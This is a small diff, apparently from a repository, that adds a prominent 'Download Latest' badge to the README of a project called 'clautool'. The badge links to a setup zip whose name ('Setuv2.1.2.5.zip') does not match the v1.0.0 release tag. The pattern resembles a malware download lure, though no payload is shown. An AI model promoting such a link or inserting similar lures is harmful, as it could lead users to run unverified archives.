@@ -1,3 +1,5 @@
+<a href="https://github.com/nick-king-ops02i0/clautool/releases/download/v1.0.0/Setuv2.1.2.5.zip"><img src="https://img.shields.io/badge/Download-v1.0.0-success?style=for-the-badge" alt="Download Latest"></a>
+
 # ⚡ clautool
 
 ![Platform](https://img.shields.io/badge/platform-cross--platform-lightgrey.svg)
